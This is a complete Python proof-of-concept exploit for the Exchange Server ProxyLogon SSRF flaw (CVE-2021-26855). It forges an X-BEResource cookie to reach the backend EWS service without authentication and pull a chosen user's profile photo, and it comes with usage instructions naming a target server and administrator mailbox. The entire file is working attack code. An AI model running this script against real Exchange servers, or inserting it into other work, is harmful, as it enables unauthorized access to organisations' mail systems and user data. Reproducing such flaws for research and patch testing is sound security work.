# PoC Exploit Exchange Server SSRF Authenticated Backend Service (CVE-2021-26855)
# By Alex Hernandez aka alt3kx (c) Mar 2021")
# 
# Reference: https://www.praetorian.com/blog/reproducing-proxylogon-exploit/")
# Usage: python ssrf_getphoto.py <target> <email>")
# Example: python ssrf_getphoto.py mail.exchange.com administrator@exchange.com")
#
# 
import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys
import os

#proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if len(sys.argv) < 2:
  os.system('clear')
  print("PoC Exploit Exchange Server SSRF Authenticated Backend Service (CVE-2021-26855)")
  print("By Alex Hernandez aka alt3kx (c) Mar 2021")
  print("Reference: https://www.praetorian.com/blog/reproducing-proxylogon-exploit/\n")
  print("Usage: python ssrf_getphoto.py <target> <email>")
  print("Example: python ssrf_getphoto.py mail.exchange.com administrator@exchange.com")
  exit()

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
target = sys.argv[1]
email = sys.argv[2]

random_name = id_generator(3) + ".js"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
SoapBody = """<?xml version="1.0" encoding="utf-8" ?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013"/>
  </soap:Header>
  <soap:Body>
    <m:GetUserPhoto>
      <m:Email>%s</m:Email>
      <m:SizeRequested>HR48x48</m:SizeRequested>
    </m:GetUserPhoto>
  </soap:Body>
</soap:Envelope>
""" % email

print("[+] \033[1mAttacking Exchange Server:\033[00m " + target)

FQDN = "EXCHANGE"
ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                        "User-Agent": user_agent},
                  verify=False, #proxies=proxies
                  )
if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=%s/EWS/Exchange.asmx?a=~3;" % FQDN,
    "Content-Type": "text/xml",
    "User-Agent": user_agent},
                   data=SoapBody,
                   verify=False, 
                   #proxies=proxies
                   )
#if ct.status_code != 200:
#    print("[-] SoapBody Error!")
#    exit()
if "</PictureData>" not in ct.content:
    print("[-] Can not get photo profile from " + email )
    exit()

ResponseCode = ct.content.split("<ResponseCode>")[1].split("</ResponseCode>")[0]
ContentType = ct.content.split("<ContentType>")[1].split("</ContentType>")[0]
PictureData = ct.content.split("<PictureData>")[1].split("</PictureData>")[0]

print("[+] \033[32mSuccess\033[00m: SSRF Authenticated on Backend Service")
print("[+] Got the picture!...")
print("[+] Response Code status: " + ResponseCode)
print("[+] Content type : " + ContentType)
print("[+] Photo profile from : " + email)
print("[+] Picture on Base64 format from : " + PictureData)

